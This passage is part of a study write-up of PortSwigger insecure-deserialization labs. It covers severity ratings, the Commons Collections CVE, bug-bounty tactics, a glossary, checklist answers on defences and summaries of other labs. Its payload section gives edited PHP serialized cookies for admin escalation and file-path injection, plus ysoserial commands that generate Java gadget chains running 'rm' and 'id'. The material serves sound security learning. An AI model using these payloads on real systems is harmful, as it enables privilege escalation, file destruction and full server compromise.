AWS IAM role name and credentials exfiltrated through the same RCE channel
        ↓
Full cloud infrastructure access — same end state reached via
XXE→SSRF (Day 35), SSTI→RCE (Day 36), now via deserialization gadget chain
```

**Severity table:**

| Finding | Severity | Reason |
|---|---|---|
| Direct property modification (Lab 1) | High | Privilege escalation without credentials |
| Property/path injection (Lab 2) | High | Arbitrary file operation via feature abuse |
| Gadget chain RCE (Lab 3) | Critical | Full server compromise, no further steps needed |
| Gadget chain RCE + cloud metadata access | Critical+ | Full infrastructure compromise |

---

## 10. Real World Context

The Apache Commons Collections deserialization vulnerability (CVE-2015-4852) affected WebLogic, JBoss, Jenkins, and WebSphere — major enterprise platforms used across the industry, because so many of them happened to bundle the same vulnerable library version. This is the exact gadget chain family (`CommonsCollections1` through `CommonsCollections7` in ysoserial) used in Lab 3 today. Java deserialization RCE consistently pays $5,000 to $30,000+ on enterprise bug bounty programs and remains one of the most consequential vulnerability classes in enterprise software, precisely because fixing it often requires either patching a deep dependency or rearchitecting how session/state data is handled entirely — not just a small code change.

**Bug bounty approach:**
- Look for cookies or hidden fields that decode as Base64 — check for PHP's readable `O:N:"ClassName"` pattern, or Java's `rO0AB` binary signature
- For PHP: try the simplest possible edit first (a boolean flag) before attempting more complex string substitutions
- For Java: confirm the `rO0AB` signature, then attempt ysoserial with multiple `CommonsCollections` variants since the correct one depends on the exact library version present
- Report severity should reflect what was actually achieved: privilege escalation (Lab 1/2 style) vs direct RCE (Lab 3 style) are very different severities even though both stem from "insecure deserialization"

---

## 11. Key Concepts Summary

| Term | Meaning |
|---|---|
| Serialization | Converting an in-memory object into a storable/transmittable format |
| Deserialization | Reconstructing a live object from its serialized format |
| `O:N:"ClassName"` | PHP serialization syntax for an Object of a given class |
| `s:N:"value"` | PHP serialization syntax for a String of length N |
| `b:0` / `b:1` | PHP serialization syntax for Boolean false / true |
| Length prefix | The number immediately after a type letter, denoting byte length — must match exactly |
| `rO0AB` | The Base64-visible signature of Java's native serialization format |
| Gadget chain | A sequence of otherwise-harmless classes whose automatic interactions during deserialization produce a dangerous effect |
| ysoserial | A tool that generates pre-built gadget chain payloads for known-vulnerable Java libraries |
| `ObjectInputStream.readObject()` | The Java method that reconstructs an object from bytes — and where unrestricted gadget chains fire |
| `resolveClass()` whitelist | A Java defense that restricts which classes may be deserialized |
| HMAC signing | Cryptographically signing serialized data so tampering can be detected before deserialization |
| Property injection | Modifying a non-boolean property's value to redirect application logic that uses that property |

---

## 12. Payloads Reference

### Lab 1 — Boolean Flag Tampering (PHP)

```
Original: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
Edited:   O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
(No length prefix changes needed — both b:0 and b:1 are 1 character)
```

### Lab 2 — String Property Injection (PHP)

```
Original: O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zv7s1moisrj1a74y7z0c3z2rmxvg6rfw";s:11:"avatar_link";s:19:"users/wiener/avatar";}

Edited:   O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zv7s1moisrj1a74y7z0c3z2rmxvg6rfw";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}

(Length prefix changed from s:19: to s:23: to match the new 23-character path)
```

### Lab 3 — Java Gadget Chain Generation (ysoserial)

```bash
# General syntax
java -jar ysoserial-all.jar [GADGET_CHAIN] '[COMMAND]' | base64

# Used today
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

# Other gadget chains worth trying if CommonsCollections4 fails
java -jar ysoserial-all.jar CommonsCollections1 'id' | base64 -w 0
java -jar ysoserial-all.jar CommonsCollections3 'id' | base64 -w 0
java -jar ysoserial-all.jar CommonsCollections5 'id' | base64 -w 0
java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 -w 0
java -jar ysoserial-all.jar CommonsCollections7 'id' | base64 -w 0

# List every gadget chain ysoserial supports
java -jar ysoserial-all.jar
```

---

## 13. Foundation Checklist

1. **What is the fundamental difference between serialization and deserialization, and where exactly does the vulnerability live?**
   Serialization converts a live object into a storable/transmittable format; deserialization reverses this, reconstructing a live object from that format. The vulnerability never lives in serialization itself — it lives in deserialization, specifically the moment the application reconstructs an object from data it did not generate itself and cannot fully trust, because reconstruction can trigger constructors, magic methods, or — in Java's case — chains of method calls across multiple classes, none of which the attacker calls directly.

2. **In Lab 1, why was changing `b:0` to `b:1` safe to do without recalculating any length prefixes, but changing a string value usually isn't?**
   Booleans in PHP's format are represented as a single digit (`0` or `1`) with no separate length prefix to track — the type letter `b` doesn't carry a length component the way `s` does. Strings, by contrast, are always preceded by their exact byte length (`s:N:"value"`), so any change to the string's length invalidates that prefix unless it's also updated — exactly what Lab 2 demonstrated when `avatar_link` went from 19 to 23 characters.

3. **Why does property injection (Lab 2 style) work even without any "obviously dangerous" property like `admin`?**
   Because the danger isn't inherent to any specific property name — it emerges from how the *application* later uses that property's value. `avatar_link` looks completely benign, but because the application's own code eventually passes that value into a file operation, redirecting its value redirects that operation. Any property feeding into a sensitive sink (file paths, database queries, command construction) is a potential attack surface, regardless of how harmless its name sounds.

4. **What is a "gadget chain" in the context of Java deserialization, and why can a chain be dangerous even when none of its individual classes look dangerous alone?**
   A gadget chain is a sequence of classes, each performing its own legitimate, narrow function, that — when deserialized together in a specific arrangement — call each other in a way that ultimately reaches a dangerous operation like `Runtime.exec()`. As seen in Lab 3, `PriorityQueue` calling `compare()`, which calls a comparator's `compare()`, which calls a transformer's `transform()`, chained repeatedly, ending in constructing a `TemplatesImpl` that defines and runs attacker-controlled bytecode — none of these steps individually look like a vulnerability. The danger exists only in the specific combination and sequence, which is exactly why a tool like ysoserial (rather than manual crafting) is the practical way to use them.

5. **Why does signing serialized data with HMAC prevent Lab 1's attack but not prevent the *existence* of the gadget chain exploited in Lab 3?**
   HMAC signing prevents *tampering* — it stops an attacker from modifying data the server itself originally created and signed, which is exactly what defeats Lab 1's boolean flip and Lab 2's path substitution, since any edit invalidates the signature. But it does nothing to address *what classes are reachable* during legitimate deserialization. If the server's own normal, unmodified, correctly-signed session data is deserialized via unrestricted `ObjectInputStream.readObject()`, and the gadget chain classes happen to be on the classpath, the chain still exists as a latent risk — HMAC signing only matters once an attacker is trying to inject their *own* malicious object, which in Lab 3's case is exactly what we did (the entire point was substituting a completely attacker-crafted object for the legitimate one, not modifying an existing legitimate one).

6. **A developer says "we switched from native serialization to JSON, so deserialization attacks are no longer possible here." Is this fully true? What's still worth checking?**
   Not fully true. Plain JSON parsing into generic data structures (dictionaries/arrays) genuinely avoids invoking magic methods or constructors, which removes the classic gadget-chain risk. But many languages and frameworks offer "smart" JSON deserializers that map JSON directly into typed objects and *do* invoke constructors or setters based on a `"type"` or `"class"` field embedded in the JSON itself (a pattern sometimes called polymorphic deserialization) — these can reintroduce the exact same risk in JSON form. It's worth checking whether the JSON library in use supports any form of type-based or class-based object instantiation directly from untrusted JSON content, rather than assuming "JSON" automatically means "safe."

---

## 14. Other Labs in This Topic — Brief Overview

PortSwigger's Insecure Deserialization category includes several additional labs beyond the three completed today. Brief summaries for future reference:

**Arbitrary object injection in PHP:** A class exists with a `__destruct()` magic method (rather than `__wakeup()`) that performs a dangerous action using one of its properties. Solve by identifying the vulnerable class from source code, crafting a serialized object of that class with the property set to achieve the goal (often deleting a file or escalating privilege), and delivering it via the session cookie — the method fires automatically when the object is garbage-collected at the end of the request.

**Exploiting Java deserialization with Apache Commons (this lab, already completed):** Covered in full above as Lab 3.

**Developing a custom gadget chain for Java deserialization:** A more advanced lab where no pre-built ysoserial chain works directly against the target, requiring inspection of the application's own custom classes (not just library classes) to manually identify a property/method combination that can be chained into a dangerous sink, then hand-building the serialized payload rather than relying on a tool.

**Using PHAR deserialization to deploy a custom gadget chain:** Exploits PHP's handling of `.phar` archive files, where certain filesystem functions (even ones that only *check* if a file exists, like `file_exists()`) can trigger deserialization of metadata embedded in a specially crafted `.phar` file — without ever calling `unserialize()` directly in application code. Solved by crafting a `.phar` archive containing a malicious serialized object as its metadata, renaming it with a non-`.phar` extension to evade upload filters, uploading it, then triggering any vulnerable filesystem function call against it using the `phar://` stream wrapper.

---
